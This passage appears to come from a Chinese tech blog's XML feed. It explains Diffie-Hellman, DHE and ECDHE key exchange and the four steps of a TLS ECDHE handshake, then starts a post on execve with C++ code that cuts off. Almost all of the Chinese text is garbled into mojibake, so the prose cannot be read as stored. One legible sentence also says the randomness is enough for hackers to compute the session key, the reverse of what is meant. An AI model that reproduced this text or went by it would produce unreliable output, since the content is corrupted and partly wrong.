å¯†å¯†é’¥</strong>ï¼Œå¯ä»¥ä½œä¸ºä¼šè¯å¯†é’¥ä½¿ç”¨ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ªå¯†é’¥åå•†è¿‡ç¨‹ä¸­ï¼Œå°çº¢å’Œå°æ˜å…¬å¼€äº† 4 ä¸ªä¿¡æ¯ï¼šPã€Gã€Aã€Bï¼Œå…¶ä¸­ Pã€G æ˜¯ç®—æ³•çš„å‚æ•°ï¼ŒA å’Œ B æ˜¯å…¬é’¥ï¼Œè€Œ aã€b æ˜¯åŒæ–¹å„è‡ªä¿ç®¡çš„ç§é’¥ï¼Œé»‘å®¢æ— æ³•è·å–è¿™ 2 ä¸ªç§é’¥ï¼Œå› æ­¤é»‘å®¢åªèƒ½ä»å…¬å¼€çš„ Pã€Gã€Aã€B å…¥æ‰‹ï¼Œè®¡ç®—å‡ºç¦»æ•£å¯¹æ•°ï¼ˆç§é’¥ï¼‰ã€‚</p><p>å‰é¢ä¹Ÿå¤šæ¬¡å¼ºè°ƒï¼Œ æ ¹æ®ç¦»æ•£å¯¹æ•°çš„åŸç†ï¼Œå¦‚æœ P æ˜¯ä¸€ä¸ªå¤§æ•°ï¼Œåœ¨ç°æœ‰çš„è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›æ˜¯å¾ˆéš¾ç ´è§£å‡º ç§é’¥ aã€b çš„ï¼Œç ´è§£ä¸å‡ºç§é’¥ï¼Œä¹Ÿå°±æ— æ³•è®¡ç®—å‡ºä¼šè¯å¯†é’¥ï¼Œå› æ­¤ DH å¯†é’¥äº¤æ¢æ˜¯å®‰å…¨çš„ã€‚</p><hr></div><h2 id="DHE-ç®—æ³•">DHE ç®—æ³•</h2><div class="story post-story"><p>æ ¹æ®ç§é’¥ç”Ÿæˆçš„æ–¹å¼ï¼ŒDH ç®—æ³•åˆ†ä¸ºä¸¤ç§å®ç°ï¼š</p><ul><li>static DH ç®—æ³•ï¼Œè¿™ä¸ªæ˜¯å·²ç»è¢«åºŸå¼ƒäº†ï¼›</li><li>DHE ç®—æ³•ï¼Œç°åœ¨å¸¸ç”¨çš„ï¼›</li></ul><p>static DH ç®—æ³•é‡Œæœ‰ä¸€æ–¹çš„ç§é’¥æ˜¯é™æ€çš„ï¼Œä¹Ÿå°±è¯´æ¯æ¬¡å¯†é’¥åå•†çš„æ—¶å€™æœ‰ä¸€æ–¹çš„ç§é’¥éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸€èˆ¬æ˜¯æœåŠ¡å™¨æ–¹å›ºå®šï¼Œå³ a ä¸å˜ï¼Œå®¢æˆ·ç«¯çš„ç§é’¥åˆ™æ˜¯éšæœºç”Ÿæˆçš„ã€‚</p><p>äºæ˜¯ï¼ŒDH äº¤æ¢å¯†é’¥æ—¶å°±åªæœ‰å®¢æˆ·ç«¯çš„å…¬é’¥æ˜¯å˜åŒ–ï¼Œè€ŒæœåŠ¡ç«¯å…¬é’¥æ˜¯ä¸å˜çš„ï¼Œé‚£ä¹ˆéšç€æ—¶é—´å»¶é•¿ï¼Œé»‘å®¢å°±ä¼šæˆªè·æµ·é‡çš„å¯†é’¥åå•†è¿‡ç¨‹çš„æ•°æ®ï¼Œå› ä¸ºå¯†é’¥åå•†çš„è¿‡ç¨‹æœ‰äº›æ•°æ®æ˜¯å…¬å¼€çš„ï¼Œé»‘å®¢å°±å¯ä»¥ä¾æ®è¿™äº›æ•°æ®æš´åŠ›ç ´è§£å‡ºæœåŠ¡å™¨çš„ç§é’¥ï¼Œç„¶åå°±å¯ä»¥è®¡ç®—å‡ºä¼šè¯å¯†é’¥äº†ï¼Œäºæ˜¯ä¹‹å‰æˆªè·çš„åŠ å¯†æ•°æ®ä¼šè¢«ç ´è§£ï¼Œæ‰€ä»¥ <strong>static DH ç®—æ³•ä¸å…·å¤‡å‰å‘å®‰å…¨æ€§</strong>ã€‚</p><p>æ—¢ç„¶å›ºå®šä¸€æ–¹çš„ç§é’¥æœ‰è¢«ç ´è§£çš„é£é™©ï¼Œé‚£ä¹ˆå¹²è„†å°±è®©åŒæ–¹çš„ç§é’¥åœ¨æ¯æ¬¡å¯†é’¥äº¤æ¢é€šä¿¡æ—¶ï¼Œéƒ½æ˜¯éšæœºç”Ÿæˆçš„ã€ä¸´æ—¶çš„ï¼Œè¿™ä¸ªæ–¹å¼ä¹Ÿå°±æ˜¯ DHE ç®—æ³•ï¼ŒE å…¨ç§°æ˜¯ ephemeralï¼ˆä¸´æ—¶æ€§çš„ï¼‰ã€‚</p><p>æ‰€ä»¥ï¼Œå³ä½¿æœ‰ä¸ªç‰›é€¼çš„é»‘å®¢ç ´è§£äº†æŸä¸€æ¬¡é€šä¿¡è¿‡ç¨‹çš„ç§é’¥ï¼Œå…¶ä»–é€šä¿¡è¿‡ç¨‹çš„ç§é’¥ä»ç„¶æ˜¯å®‰å…¨çš„ï¼Œå› ä¸º<strong>æ¯ä¸ªé€šä¿¡è¿‡ç¨‹çš„ç§é’¥éƒ½æ˜¯æ²¡æœ‰ä»»ä½•å…³ç³»çš„ï¼Œéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œè¿™æ ·å°±ä¿è¯äº†ã€Œå‰å‘å®‰å…¨ã€</strong>ã€‚</p><hr></div><h2 id="ECDHE-ç®—æ³•">ECDHE ç®—æ³•</h2><div class="story post-story"><p>DHE ç®—æ³•ç”±äºè®¡ç®—æ€§èƒ½ä¸ä½³ï¼Œå› ä¸ºéœ€è¦åšå¤§é‡çš„ä¹˜æ³•ï¼Œä¸ºäº†æå‡ DHE ç®—æ³•çš„æ€§èƒ½ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ç°åœ¨å¹¿æ³›ç”¨äºå¯†é’¥äº¤æ¢ç®—æ³• â€”â€” <strong>ECDHE ç®—æ³•</strong>ã€‚</p><p>ECDHE ç®—æ³•æ˜¯åœ¨ DHE ç®—æ³•çš„åŸºç¡€ä¸Šåˆ©ç”¨äº† ECC æ¤­åœ†æ›²çº¿ç‰¹æ€§ï¼Œå¯ä»¥ç”¨æ›´å°‘çš„è®¡ç®—é‡è®¡ç®—å‡ºå…¬é’¥ï¼Œä»¥åŠæœ€ç»ˆçš„ä¼šè¯å¯†é’¥ã€‚</p><p>å°çº¢å’Œå°æ˜ä½¿ç”¨ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•çš„è¿‡ç¨‹ï¼š</p><ul><li>åŒæ–¹äº‹å…ˆç¡®å®šå¥½ä½¿ç”¨å“ªç§æ¤­åœ†æ›²çº¿ï¼Œå’Œæ›²çº¿ä¸Šçš„åŸºç‚¹ Gï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å…¬å¼€çš„ï¼›</li><li>åŒæ–¹å„è‡ªéšæœºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä½œä¸º<strong>ç§é’¥d</strong>ï¼Œå¹¶ä¸åŸºç‚¹ Gç›¸ä¹˜å¾—åˆ°<strong>å…¬é’¥Q</strong>ï¼ˆQ = dGï¼‰ï¼Œæ­¤æ—¶å°çº¢çš„å…¬ç§é’¥ä¸º Q1 å’Œ d1ï¼Œå°æ˜çš„å…¬ç§é’¥ä¸º Q2 å’Œ d2ï¼›</li><li>åŒæ–¹äº¤æ¢å„è‡ªçš„å…¬é’¥ï¼Œæœ€åå°çº¢è®¡ç®—ç‚¹ï¼ˆx1ï¼Œy1ï¼‰ = d1Q2ï¼Œå°æ˜è®¡ç®—ç‚¹ï¼ˆx2ï¼Œy2ï¼‰ = d2Q1ï¼Œç”±äºæ¤­åœ†æ›²çº¿ä¸Šæ˜¯å¯ä»¥æ»¡è¶³ä¹˜æ³•äº¤æ¢å’Œç»“åˆå¾‹ï¼Œæ‰€ä»¥ d1Q2 = d1d2G = d2d1G = d2Q1 ï¼Œå› æ­¤<strong>åŒæ–¹çš„ x åæ ‡æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯å…±äº«å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯ä¼šè¯å¯†é’¥</strong>ã€‚</li></ul><p>è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒåŒæ–¹çš„ç§é’¥éƒ½æ˜¯éšæœºã€ä¸´æ—¶ç”Ÿæˆçš„ï¼Œéƒ½æ˜¯ä¸å…¬å¼€çš„ï¼Œå³ä½¿æ ¹æ®å…¬å¼€çš„ä¿¡æ¯ï¼ˆæ¤­åœ†æ›²çº¿ã€å…¬é’¥ã€åŸºç‚¹ Gï¼‰ä¹Ÿæ˜¯å¾ˆéš¾è®¡ç®—å‡ºæ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°ï¼ˆç§é’¥ï¼‰ã€‚</p><hr></div><h2 id="ECDHE-æ¡æ‰‹è¿‡ç¨‹">ECDHE æ¡æ‰‹è¿‡ç¨‹</h2><div class="story post-story"><p>çŸ¥é“äº† ECDHE ç®—æ³•åŸºæœ¬åŸç†åï¼Œæˆ‘ä»¬å°±ç»“åˆå®é™…çš„æƒ…å†µæ¥çœ‹çœ‹ã€‚</p><p>æˆ‘ç”¨ Wireshark å·¥å…·æŠ“äº†ç”¨ ECDHE å¯†é’¥åå•†ç®—æ³•çš„ TSL æ¡æ‰‹è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å››æ¬¡æ¡æ‰‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/18/VgJoF7uREmt8UhK.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/VgJoF7uREmt8UhK.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>ç»†å¿ƒçš„å°ä¼™ä¼´åº”è¯¥å‘ç°äº†ï¼Œ<strong>ä½¿ç”¨äº† ECDHEï¼Œåœ¨ TLS ç¬¬å››æ¬¡æ¡æ‰‹å‰ï¼Œå®¢æˆ·ç«¯å°±å·²ç»å‘é€äº†åŠ å¯†çš„ HTTP æ•°æ®</strong>ï¼Œè€Œå¯¹äº RSA æ¡æ‰‹è¿‡ç¨‹ï¼Œå¿…é¡»è¦å®Œæˆ TLS å››æ¬¡æ¡æ‰‹ï¼Œæ‰èƒ½ä¼ è¾“åº”ç”¨æ•°æ®ã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>ECDHE ç›¸æ¯” RSA æ¡æ‰‹è¿‡ç¨‹çœå»äº†ä¸€ä¸ªæ¶ˆæ¯å¾€è¿”çš„æ—¶é—´</strong>ï¼Œè¿™ä¸ªæœ‰ç‚¹ã€ŒæŠ¢è·‘ã€çš„æ„æ€ï¼Œå®ƒè¢«ç§°ä¸ºæ˜¯ã€Œ<em>TLS False Start</em>ã€ï¼Œè·Ÿã€Œ<em>TCP Fast Open</em>ã€æœ‰ç‚¹åƒï¼Œéƒ½æ˜¯åœ¨è¿˜æ²¡è¿æ¥å®Œå…¨å»ºç«‹å‰ï¼Œå°±å‘é€äº†åº”ç”¨æ•°æ®ï¼Œè¿™æ ·ä¾¿æé«˜äº†ä¼ è¾“çš„æ•ˆç‡ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œåˆ†ææ¯ä¸€ä¸ª ECDHE æ¡æ‰‹è¿‡ç¨‹ã€‚</p><h3 id="TLS-ç¬¬ä¸€æ¬¡æ¡æ‰‹">TLS ç¬¬ä¸€æ¬¡æ¡æ‰‹</h3><p>å®¢æˆ·ç«¯é¦–å…ˆä¼šå‘ä¸€ä¸ªã€Œ<strong>Client Hello</strong>ã€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é‡Œé¢æœ‰å®¢æˆ·ç«¯ä½¿ç”¨çš„ TLS ç‰ˆæœ¬å·ã€æ”¯æŒçš„å¯†ç å¥—ä»¶åˆ—è¡¨ï¼Œä»¥åŠç”Ÿæˆçš„<strong>éšæœºæ•°ï¼ˆ<em><strong><strong>Client Random</strong></strong></em>ï¼‰</strong>ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/MD6xLujoHBTmyIs.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/MD6xLujoHBTmyIs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><h3 id="TLS-ç¬¬äºŒæ¬¡æ¡æ‰‹">TLS ç¬¬äºŒæ¬¡æ¡æ‰‹</h3><p>æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„ã€Œæ‰“æ‹›å‘¼ã€ï¼ŒåŒæ ·ä¹Ÿè¦å›ç¤¼ï¼Œä¼šè¿”å›ã€Œ<strong>Server Hello</strong>ã€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é¢æœ‰æœåŠ¡å™¨ç¡®è®¤çš„ TLS ç‰ˆæœ¬å·ï¼Œä¹Ÿç»™å‡ºäº†ä¸€ä¸ª<strong>éšæœºæ•°ï¼ˆ<em><strong><strong>Server Random</strong></strong></em>ï¼‰</strong>ï¼Œç„¶åä»å®¢æˆ·ç«¯çš„å¯†ç å¥—ä»¶åˆ—è¡¨é€‰æ‹©äº†ä¸€ä¸ªåˆé€‚çš„å¯†ç å¥—ä»¶ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/TiRxOgnjIAKPWCq.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/TiRxOgnjIAKPWCq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>ä¸è¿‡ï¼Œè¿™æ¬¡é€‰æ‹©çš„å¯†ç å¥—ä»¶å°±å’Œ RSA ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™æ¬¡çš„å¯†ç å¥—ä»¶çš„æ„æ€ã€‚</p><p>ã€Œ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384ã€</p><ul><li>å¯†é’¥åå•†ç®—æ³•ä½¿ç”¨ ECDHEï¼›</li><li>ç­¾åç®—æ³•ä½¿ç”¨ RSAï¼›</li><li>æ¡æ‰‹åçš„é€šä¿¡ä½¿ç”¨ AES å¯¹ç§°ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦ 256 ä½ï¼Œåˆ†ç»„æ¨¡å¼æ˜¯ GCMï¼›</li><li>æ‘˜è¦ç®—æ³•ä½¿ç”¨ SHA384ï¼›</li></ul><p>æ¥ç€ï¼ŒæœåŠ¡ç«¯ä¸ºäº†è¯æ˜è‡ªå·±çš„èº«ä»½ï¼Œå‘é€ã€Œ<strong>Certificate</strong>ã€æ¶ˆæ¯ï¼Œä¼šæŠŠè¯ä¹¦ä¹Ÿå‘ç»™å®¢æˆ·ç«¯ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/6o9lOamGdANH8yi.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/6o9lOamGdANH8yi.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>è¿™ä¸€æ­¥å°±å’Œ RSA æ¡æ‰‹è¿‡ç¨‹æœ‰å¾ˆå¤§åˆ°åŒºåˆ«äº†ï¼Œå› ä¸ºæœåŠ¡ç«¯é€‰æ‹©äº† ECDHE å¯†é’¥åå•†ç®—æ³•ï¼Œæ‰€ä»¥ä¼šåœ¨å‘é€å®Œè¯ä¹¦åï¼Œå‘é€ã€Œ<strong>Server Key Exchange</strong>ã€æ¶ˆæ¯ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/rXhpkzVBjKb4aR8.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/rXhpkzVBjKb4aR8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>è¿™ä¸ªè¿‡ç¨‹æœåŠ¡å™¨åšäº†ä¸‰ä»¶äº‹ï¼š</p><ul><li>é€‰æ‹©äº†<strong>åä¸º named_curve çš„æ¤­åœ†æ›²çº¿</strong>ï¼Œé€‰å¥½äº†æ¤­åœ†æ›²çº¿ç›¸å½“äºæ¤­åœ†æ›²çº¿åŸºç‚¹ G ä¹Ÿå®šå¥½äº†ï¼Œè¿™äº›éƒ½ä¼šå…¬å¼€ç»™å®¢æˆ·ç«¯ï¼›</li><li>ç”Ÿæˆéšæœºæ•°ä½œä¸ºæœåŠ¡ç«¯æ¤­åœ†æ›²çº¿çš„ç§é’¥ï¼Œä¿ç•™åˆ°æœ¬åœ°ï¼›</li><li>æ ¹æ®åŸºç‚¹ G å’Œç§é’¥è®¡ç®—å‡º<strong>æœåŠ¡ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥</strong>ï¼Œè¿™ä¸ªä¼šå…¬å¼€ç»™å®¢æˆ·ç«¯ã€‚</li></ul><p>ä¸ºäº†ä¿è¯è¿™ä¸ªæ¤­åœ†æ›²çº¿çš„å…¬é’¥ä¸è¢«ç¬¬ä¸‰æ–¹ç¯¡æ”¹ï¼ŒæœåŠ¡ç«¯ä¼šç”¨ RSA ç­¾åç®—æ³•ç»™æœåŠ¡ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥åšä¸ªç­¾åã€‚</p><p>éšåï¼Œå°±æ˜¯ã€Œ<strong>Server Hello Done</strong>ã€æ¶ˆæ¯ï¼ŒæœåŠ¡ç«¯è·Ÿå®¢æˆ·ç«¯è¡¨æ˜ï¼šâ€œè¿™äº›å°±æ˜¯æˆ‘æä¾›çš„ä¿¡æ¯ï¼Œæ‰“æ‹›å‘¼å®Œæ¯•â€ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/AoNGRBWg47hzsq5.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/AoNGRBWg47hzsq5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>è‡³æ­¤ï¼ŒTLS ä¸¤æ¬¡æ¡æ‰‹å°±å·²ç»å®Œæˆäº†ï¼Œç›®å‰å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šè¿‡æ˜æ–‡å…±äº«äº†è¿™å‡ ä¸ªä¿¡æ¯ï¼š<strong>Client Randomã€Server Random ã€ä½¿ç”¨çš„æ¤­åœ†æ›²çº¿ã€æ¤­åœ†æ›²çº¿åŸºç‚¹ Gã€æœåŠ¡ç«¯æ¤­åœ†æ›²çº¿çš„å…¬é’¥</strong>ï¼Œè¿™å‡ ä¸ªä¿¡æ¯å¾ˆé‡è¦ï¼Œæ˜¯åç»­ç”Ÿæˆä¼šè¯å¯†é’¥çš„ææ–™ã€‚</p><h3 id="TLS-ç¬¬ä¸‰æ¬¡æ¡æ‰‹">TLS ç¬¬ä¸‰æ¬¡æ¡æ‰‹</h3><p>å®¢æˆ·ç«¯æ”¶åˆ°äº†æœåŠ¡ç«¯çš„è¯ä¹¦åï¼Œè‡ªç„¶è¦æ ¡éªŒè¯ä¹¦æ˜¯å¦åˆæ³•ï¼Œå¦‚æœè¯ä¹¦åˆæ³•ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯åˆ°èº«ä»½å°±æ˜¯æ²¡é—®é¢˜çš„ã€‚æ ¡éªŒè¯ä¹¦åˆ°è¿‡ç¨‹ï¼Œä¼šèµ°è¯ä¹¦é“¾é€çº§éªŒè¯ï¼Œç¡®è®¤è¯ä¹¦çš„çœŸå®æ€§ï¼Œå†ç”¨è¯ä¹¦çš„å…¬é’¥éªŒè¯ç­¾åï¼Œè¿™æ ·å°±èƒ½ç¡®è®¤æœåŠ¡ç«¯çš„èº«ä»½äº†ï¼Œç¡®è®¤æ— è¯¯åï¼Œå°±å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°ã€‚</p><p>å®¢æˆ·ç«¯ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä½œä¸ºå®¢æˆ·ç«¯æ¤­åœ†æ›²çº¿çš„ç§é’¥ï¼Œç„¶åå†æ ¹æ®æœåŠ¡ç«¯å‰é¢ç»™çš„ä¿¡æ¯ï¼Œç”Ÿæˆ<strong>å®¢æˆ·ç«¯çš„æ¤­åœ†æ›²çº¿å…¬é’¥</strong>ï¼Œç„¶åç”¨ã€Œ<strong>Client Key Exchange</strong>ã€æ¶ˆæ¯å‘ç»™æœåŠ¡ç«¯ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/GXEzYAjMChVbuwq.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/GXEzYAjMChVbuwq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>è‡³æ­¤ï¼ŒåŒæ–¹éƒ½æœ‰å¯¹æ–¹çš„æ¤­åœ†æ›²çº¿å…¬é’¥ã€è‡ªå·±çš„æ¤­åœ†æ›²çº¿ç§é’¥ã€æ¤­åœ†æ›²çº¿åŸºç‚¹ Gã€‚äºæ˜¯ï¼ŒåŒæ–¹éƒ½å°±è®¡ç®—å‡ºç‚¹ï¼ˆxï¼Œyï¼‰ï¼Œå…¶ä¸­ x åæ ‡å€¼åŒæ–¹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå‰é¢è¯´ ECDHE ç®—æ³•æ—¶å€™ï¼Œè¯´ x æ˜¯ä¼šè¯å¯†é’¥ï¼Œ<strong>ä½†å®é™…åº”ç”¨ä¸­ï¼Œx è¿˜ä¸æ˜¯æœ€ç»ˆçš„ä¼šè¯å¯†é’¥</strong>ã€‚</p><p>è¿˜è®°å¾— TLS æ¡æ‰‹é˜¶æ®µï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½ä¼šç”Ÿæˆäº†ä¸€ä¸ªéšæœºæ•°ä¼ é€’ç»™å¯¹æ–¹å—ï¼Ÿ</p><p><strong>æœ€ç»ˆçš„ä¼šè¯å¯†é’¥ï¼Œå°±æ˜¯ç”¨ã€Œå®¢æˆ·ç«¯éšæœºæ•° + æœåŠ¡ç«¯éšæœºæ•° + xï¼ˆECDHE ç®—æ³•ç®—å‡ºçš„å…±äº«å¯†é’¥ï¼‰ ã€ä¸‰ä¸ªææ–™ç”Ÿæˆçš„</strong>ã€‚</p><p>ä¹‹æ‰€ä»¥è¿™ä¹ˆéº»çƒ¦ï¼Œæ˜¯å› ä¸º TLS è®¾è®¡è€…ä¸ä¿¡ä»»å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨ã€Œä¼ªéšæœºæ•°ã€çš„å¯é æ€§ï¼Œä¸ºäº†ä¿è¯çœŸæ­£çš„å®Œå…¨éšæœºï¼ŒæŠŠä¸‰ä¸ªä¸å¯é çš„éšæœºæ•°æ··åˆèµ·æ¥ï¼Œé‚£ä¹ˆã€Œéšæœºã€çš„ç¨‹åº¦å°±éå¸¸é«˜äº†ï¼Œè¶³å¤Ÿè®©é»‘å®¢è®¡ç®—å‡ºæœ€ç»ˆçš„ä¼šè¯å¯†é’¥ï¼Œå®‰å…¨æ€§æ›´é«˜ã€‚</p><p>ç®—å¥½ä¼šè¯å¯†é’¥åï¼Œå®¢æˆ·ç«¯ä¼šå‘ä¸€ä¸ªã€Œ<strong>Change Cipher Spec</strong>ã€æ¶ˆæ¯ï¼Œå‘Šè¯‰æœåŠ¡ç«¯åç»­æ”¹ç”¨å¯¹ç§°ç®—æ³•åŠ å¯†é€šä¿¡ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/8vbLxPBazorQOAc.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/8vbLxPBazorQOAc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><p>æ¥ç€ï¼Œå®¢æˆ·ç«¯ä¼šå‘ã€Œ<strong>Encrypted Handshake Message</strong>ã€æ¶ˆæ¯ï¼ŒæŠŠä¹‹å‰å‘é€çš„æ•°æ®åšä¸€ä¸ªæ‘˜è¦ï¼Œå†ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†ä¸€ä¸‹ï¼Œè®©æœåŠ¡ç«¯åšä¸ªéªŒè¯ï¼ŒéªŒè¯ä¸‹æœ¬æ¬¡ç”Ÿæˆçš„å¯¹ç§°å¯†é’¥æ˜¯å¦å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p><p><img src="https://s2.loli.net/2022/07/18/xj3wKPcTQfpXhYA.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/18/xj3wKPcTQfpXhYA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å›¾è§£ ECDHE å¯†é’¥äº¤æ¢ç®—æ³•"></p><h3 id="TLS-ç¬¬å››æ¬¡æ¡æ‰‹">TLS ç¬¬å››æ¬¡æ¡æ‰‹</h3><p>æœ€åï¼ŒæœåŠ¡ç«¯ä¹Ÿä¼šæœ‰ä¸€ä¸ªåŒæ ·çš„æ“ä½œï¼Œå‘ã€Œ<strong>Change Cipher Spec</strong>ã€å’Œã€Œ<strong>Encrypted Handshake Message</strong>ã€æ¶ˆæ¯ï¼Œå¦‚æœåŒæ–¹éƒ½éªŒè¯åŠ å¯†å’Œè§£å¯†æ²¡é—®é¢˜ï¼Œé‚£ä¹ˆæ¡æ‰‹æ­£å¼å®Œæˆã€‚äºæ˜¯ï¼Œå°±å¯ä»¥æ­£å¸¸æ”¶å‘åŠ å¯†çš„ HTTP è¯·æ±‚å’Œå“åº”äº†ã€‚</p><hr><h1>æ€»ç»“</h1><p>RSA å’Œ ECDHE æ¡æ‰‹è¿‡ç¨‹çš„åŒºåˆ«ï¼š</p><ul><li>RSA å¯†é’¥åå•†ç®—æ³•ã€Œä¸æ”¯æŒã€å‰å‘ä¿å¯†ï¼ŒECDHE å¯†é’¥åå•†ç®—æ³•ã€Œæ”¯æŒã€å‰å‘ä¿å¯†ï¼›</li><li>ä½¿ç”¨äº† RSA å¯†é’¥åå•†ç®—æ³•ï¼ŒTLS å®Œæˆå››æ¬¡æ¡æ‰‹åï¼Œæ‰èƒ½è¿›è¡Œåº”ç”¨æ•°æ®ä¼ è¾“ï¼Œè€Œå¯¹äº ECDHE ç®—æ³•ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä¸ç”¨ç­‰æœåŠ¡ç«¯çš„æœ€åä¸€æ¬¡ TLS æ¡æ‰‹ï¼Œå°±å¯ä»¥æå‰å‘å‡ºåŠ å¯†çš„ HTTP æ•°æ®ï¼ŒèŠ‚çœäº†ä¸€ä¸ªæ¶ˆæ¯çš„å¾€è¿”æ—¶é—´ï¼›</li><li>ä½¿ç”¨ ECDHEï¼Œ åœ¨ TLS ç¬¬ 2 æ¬¡æ¡æ‰‹ä¸­ï¼Œä¼šå‡ºç°æœåŠ¡å™¨ç«¯å‘å‡ºçš„ã€ŒServer Key Exchangeã€æ¶ˆæ¯ï¼Œè€Œ RSA æ¡æ‰‹è¿‡ç¨‹æ²¡æœ‰è¯¥æ¶ˆæ¯ï¼›</li></ul><p>åŸæ–‡ï¼š<a href="https://www.cnblogs.com/xiaolincoding/p/14318338.html">https://www.cnblogs.com/xiaolincoding/p/14318338.html</a></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECDHE </tag>
            
            <tag> å¯†é’¥åå•† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Execve æ‰§è¡Œé‡åˆ°çš„é—®é¢˜</title>
      <link href="/posts/2a91f3eb/"/>
      <url>/posts/2a91f3eb/</url>
      
        <content type="html"><![CDATA[<p>ä¸€æ®µå¾ˆç®€å•çš„C++ä»£ç ï¼Œ è¾“å…¥aï¼Œb è¾“å‡ºa/bï¼›</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/***  * @                       _oo0oo_ * @                      o8888888o * @                      88" . "88 * @                      (| -_- |) * @                      0\  =  /0 * @                    ___/`---'\___ * @                  .' \\|     |// '. * @                 / \\|||  :  |||// \ * @                / _||||| -:- |||||- \ * @               |   | \\\  - /// |   | * @               | \_|  ''\---/''  |_/ | * @               \  .-\__  '-'  ___/-. / * @             ___'. .'  /--.--\  `. .'___ * @          ."" '&lt;  `.___\_&lt;|>_/___.' >' "". * @         | | :  `- \`.;`\ _ /`;.`/ - ` : | | * @         \  \ `_.   \_ __\ /__ _/   .-` /  / * @     =====`-.____`.___ \_____/___.-`___.-'===== * @                       `=---=' * @ * @ * @     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ * @ * @           ä½›ç¥–ä¿ä½‘     æ°¸ä¸å®•æœº     æ°¸æ— BUG * @ * @ */</span># <span class="token number">2.</span>cpp<span class="token macro property"><span class="token 